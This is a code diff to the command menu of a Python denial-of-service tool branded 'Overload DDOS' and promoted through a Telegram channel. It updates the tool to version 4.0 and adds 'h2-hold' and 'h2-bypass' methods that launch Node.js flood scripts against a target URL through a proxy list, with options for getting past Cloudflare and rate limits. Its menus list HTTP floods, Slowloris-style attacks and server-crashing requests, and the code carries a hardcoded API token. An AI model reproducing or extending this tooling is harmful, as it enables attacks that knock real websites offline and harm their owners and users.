@@ -92,7 +92,7 @@ def get_url_info(url, token):
         return None
                                                                                                                                                                                                                                                                                    
 def si(): 
-    print('         [ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v3.0')
+    print('         [ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v4.0')
     print("")                
 
 def layer7():
@@ -113,8 +113,8 @@ def layer7():
     print("▶ crash         : Upaya untuk merusak server target (misalnya, melalui permintaan yang salah format)")
     print("▶ httpflood     : Banjir HTTP dasar (tingkat tinggi, berbagai jenis permintaan)")
     print("▶ httpssl     : Serangan yang menargetkan komunikasi terenkripsi menggunakan protokol HTTPS/SSL")
-    print("▶ cf-socket     : Serangan berbasis soket tingkat rendah untuk target yang dilindungi Cloudflare")
-    print("▶ cf-pro        : Teknik bypass Cloudflare yang lebih canggih atau 'profesional'")
+    print("▶ h2-hold     : Serangan lebih lama untuk target yang dilindungi Cloudflare")
+    print("▶ h2-bypass        : Teknik bypass Cloudflare yang lebih canggih")
     print("▶ hyper         : Serangan dengan laju permintaan yang sangat tinggi")
     print("▶ slow          : Serangan mirip Slowloris (mempertahankan koneksi lambat untuk menguras sumber daya server)")
     print("▶ https-spoof   : Mencoba memalsukan permintaan HTTPS agar terlihat sah atau melewati filter")
@@ -171,8 +171,8 @@ def usage():
     print("▶ crash         : crash https://target.com GET")
     print("▶ httpflood     : httpflood https://target.com 15000 get 60")
     print("▶ httpssl     : httpssl https://target.com port 60")
-    print("▶ cf-socket     : cf-socket https://target.com 60 100 100")
-    print("▶ cf-pro        : cf-pro https://target.com 60 100 100")
+    print("▶ h2-hold     : h2-hold https://target.com 60 100 100")
+    print("▶ h2-bypass        : h2-bypass https://target.com 60")
     print("▶ hyper         : hyper https://target.com 60")
     print("▶ slow          : slow https://target.com 60")
     print("▶ https-spoof   : https-spoof https://target.com 60")
@@ -216,7 +216,7 @@ def menu():
     clear_screen()
     
     # Pesan informasi awal dengan efek kedip MERAH
-    print("\x1b[5;31m" + '[ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v3.0' + "\x1b[0m")
+    print("\x1b[5;31m" + '[ t.me/POWERPROOFOVERLOAD ] | Welcome to Overload DDOS! | Owner: @OverloadServer | Update v4.0' + "\x1b[0m")
     print("")
 
     # Seni ASCII (logo) - Diatur ke warna PUTIH statis untuk kontras
@@ -753,7 +753,7 @@ def main():
                [Sistem] Informasi
                Target: {url}
                Waktu: {time}s
-               Metode: slow
+               Metode: cf-flood
                Ketik [CLS] untuk membersihkan terminal""")
                           
             except IndexError:
@@ -764,29 +764,66 @@ def main():
             except Exception as e:
                 print(f"Terjadi kesalahan saat menjalankan perintah: {e}")        
                 
-        elif "cf-socket" in cnc:
+        elif "h2-hold" in cnc:
             try:
-                os.system(f'python3 bypass.py')
-                url = f"{url}"
-                token = "727e8c2fa5b07c"
-                result = get_url_info(url, token)
-                print(result) 
-            except Exception as e:
-                print(f"Error executing command: {e}")
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node h2-holdv1.js {url} {time} 100 100 proxies.txt')     
+               os.system(f'node h2-holdv2.js {url} {time} 100 100 proxies.txt')     
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result)             
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: h2-hold
+               Ketik [CLS] untuk membersihkan terminal""")
+                          
             except IndexError:
-                print('cf-socket')
+                print('Penggunaan: h2-hold <url> <waktu>')
+                print('Contoh: h2-hold http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
     
-        elif "cf-pro" in cnc:
+        elif "h2-bypass" in cnc:
             try:
-                os.system(f'python3 cf-pro.py')
-                url = f"{url}"
-                token = "727e8c2fa5b07c"
-                result = get_url_info(url, token)
-                print(result) 
-            except Exception as e:
-                print(f"Error executing command: {e}")
+               url, time = cnc.split()[1:3]
+               os.system("clear")  # Bersihkan layar (opsional)
+               
+               os.system(f'node h2-bypass.js GET {url} {time} 100 100 proxies.txt --bfm true --ratelimit true --randpath true --randrate true --debug true --cdn true --full')          
+               
+               url = f"{url}"
+               token = "727e8c2fa5b07c"
+               result = get_url_info(url, token)
+               print(result)             
+                
+               sys.stdout.write(f"\x1b]2; T.ME/POWERPROOFOVERLOAD\x07")
+               sys.stdout.flush()
+               
+               print(f"""
+               [Sistem] Informasi
+               Target: {url}
+               Waktu: {time}s
+               Metode: h2-bypass
+               Ketik [CLS] untuk membersihkan terminal""")
+                          
             except IndexError:
-                print('cf-pro')
+                print('Penggunaan: h2-bypass <url> <waktu>')
+                print('Contoh: h2-bypass http://example.com 60')
+            except ValueError as ve:
+                print(f"Waktu tidak valid: {ve}")
+            except Exception as e:
+                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")
         
         elif "cfgas" in cnc:
             try:
